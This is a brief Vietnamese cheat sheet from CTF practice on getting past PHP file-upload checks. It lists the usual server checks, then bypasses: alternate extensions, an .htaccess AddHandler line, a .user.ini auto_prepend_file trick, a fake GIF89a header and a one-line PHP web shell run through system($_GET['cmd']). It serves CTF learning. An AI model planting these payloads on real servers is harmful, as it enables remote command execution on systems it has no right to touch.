# File Upload Cheet 
Lụm nhặt, đút kết, xin xỏ từ mọi nguồn. Có thấy sai thì thôi không cần góp ý ::icons:


## How it work?
Theo kinh nghiệm chơi CTF nửa năm nay thì đa phần ở dạng cơ bản server sẽ check: 
- Extension: chỉ cho phép upload các file có đuôi trong white list
```php
if($imageFileType != "jpg" && $imageFileType != "png" 
&& $imageFileType != "jpeg" && $imageFileType != "gif" ) {
    echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
    $uploadOk = 0;
}
```
- Check mine:
```php
$check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
# getimagesize() đọc header của file trả về: Array[weight, h, mine]
if($check !== false) {
    echo "File is an image - " . $check["mime"] . ".";
    $uploadOk = 1;
} else {
    echo "File is not an image.";
    $uploadOk = 0;
}
```
- Check nội dung file: 
```php
$content = file_get_contents($uploaded_tmp);
if(preg_match("/\<\?/i", $content)){
    die("诶，别蒙我啊，这标志明显还是php啊");
}
```

## Bypass
Với từng trường hợp thì sẽ có những cách vượt rào riêng ~~hoặc không~~
- Extension
    - Không có cách cụ thể để bypass, theo kinh nghiệm cá nhân thì khi biết có fillter này ta nên ~~bỏ cuộc~~ fuzzing... hên thì được vài cái như `(phtml, php36,...)`
    - Nếu cho phép up `.htaccess` thì quá ngon. Note: `không check mine thì xài được`

### .htaccess
Đa phần các challenge chạy Apache nên dùng ngon, bị cái nếu thêm header để bypass mine thì file này tạch. ~~có cái hay hơn~~
```php
AddHandler application/x-httpd-php .png
```
### .usr.ini (phpruntime)
Cái này ngon nếu server cho phép `auto_prepend_file`
```php
; Kich hoat PHP tu dong them file vao truoc khi chay script khac
auto_prepend_file = shell.png

```
- Mine: Với getimagesize() thì fake cái header "GIF89a" 
- Content: Làm cách nào để viết mã php mà không cần dấu ? ~~<script>~~

### Script
Script chỉ là một cách để viết, còn nhiều mà làm biếng quá
```html
<script language='php'> 
	system($_GET['cmd']); 
</script>
```
~~khi nào siêng sẽ làm thêm về bypass khi up được shell (fillter system,ls,space,cat,...)~~
``còn thiếu waf mà làm biếng quá ``




